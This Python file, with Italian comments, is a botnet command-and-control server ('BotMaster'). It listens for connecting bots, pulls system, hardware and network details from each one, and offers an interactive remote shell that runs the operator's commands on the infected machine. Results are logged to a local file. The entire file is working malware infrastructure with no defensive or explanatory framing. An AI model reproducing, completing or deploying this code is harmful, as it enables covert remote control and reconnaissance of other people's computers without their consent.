from socket import *
serverPort = 12003
 #Dimensione del buffer, in questo caso il messaggio ricevuto puo essere al piu 4kb ma possiamo ovviamente aumentare nel caso
BUFFER_SIZE = 1024 * 4
serverSocket = socket(AF_INET,SOCK_STREAM)
serverName = gethostbyname(gethostname())
serverSocket.bind(('',serverPort))
serverSocket.listen(1)
print('Il BotMaster con indirizzo IP:',serverName, 'e\' pronto a ricevere le informazioni dalla Botnet client...')

def invia_messaggio(messaggio):
    global connectionSocket
    try:
        connectionSocket.send(messaggio.encode())
        return True
    except Exception as e:
        #Il client si e' disconnesso nel mentre, tentiamo la riconnessione a un bot
        print (str(e.errno))
        print(str(e))
        connectionSocket.close()
        connectionSocket, addr = serverSocket.accept()
        print ("Messaggio non inviato, bot master connesso ad un bot con indirizzo" + str(addr))
        cwd = ricevi_messaggio()
        return False


def ricevi_stampa_messaggio():
    global connectionSocket
    messaggio = str(ricevi_messaggio())
    f = open("Info.txt", "a")
    f.write(messaggio)
    f.close()
    print(messaggio)
        
def ricevi_messaggio():
    global connectionSocket
    try:
        messaggio = connectionSocket.recv(BUFFER_SIZE).decode()
        return str(messaggio)
    except Exception as e:
        #Il client si e' disconnesso nel mentre, tentiamo la riconnessione a un bot
        print (str(e.errno))
        print(str(e))
        connectionSocket.close()
        connectionSocket, addr = serverSocket.accept()
        print ("Messaggio non ricevuto, bot master connesso ad un bot con indirizzo" + str(addr))
        cwd = ricevi_messaggio()
        return ""
        
def menu():
    print("\nScegliere l'operazione da eseguire:\n"
          +"0: termina la connessione\n"
          +"1: ricevi informazioni sul sistema operativo\n"
          +"2: ricevi informazioni sul processore\n"
          +"3: ricevi informazioni sul tempo d'avvio\n"
          +"4: ricevi informazioni sulla memoria RAM\n"
          +"5: ricevi informazioni sul disco\n"
          +"6: ricevi informazioni sulla scheda di rete e interfacce di rete\n"
          +"7: entra in controllo della bash\n"
          +"8: riepilogo informazioni\n")
    return input()
    
while True:
    connectionSocket, addr = serverSocket.accept()
    print('\nNuova Botnet client connessa al BotMaster', addr)
    cwd = ricevi_messaggio()
    
    while True:
        comando = menu()

        if comando == '7':
            cmd = ''
            while cmd.lower() != "exit": #Finche non scegliamo di uscire dalla bash
                cmd = input(f"{cwd}$>") #stampiamo la cwd, prendiamo il comando da eseguire e lo mandiamo
                if cmd.lower() != "exit":
                    if (not(invia_messaggio(f"7<sep>{cmd}"))): break
                    output = ricevi_messaggio()
                    risultato = output.split('<sep>')
                    if (len(risultato)==2):
                        queryRes, cwd = output.split('<sep>')
                        f = open("Info.txt", "a")
                        f.write("Comando inviato: " + cmd)
                        f.write("\nRisultato:\n")
                        f.write (queryRes)
                        f.write("\n\n\n")
                        f.close()
                    else: queryRes = "Errore"
                    print(queryRes + "\n")
        else:
            invia_messaggio(comando)
            if (comando != "0"):
                ricevi_stampa_messaggio()
            else:
                break

    connectionSocket.close()
    print("Precedente connessione terminata, BotMaster in attesa di un nuovo bot")

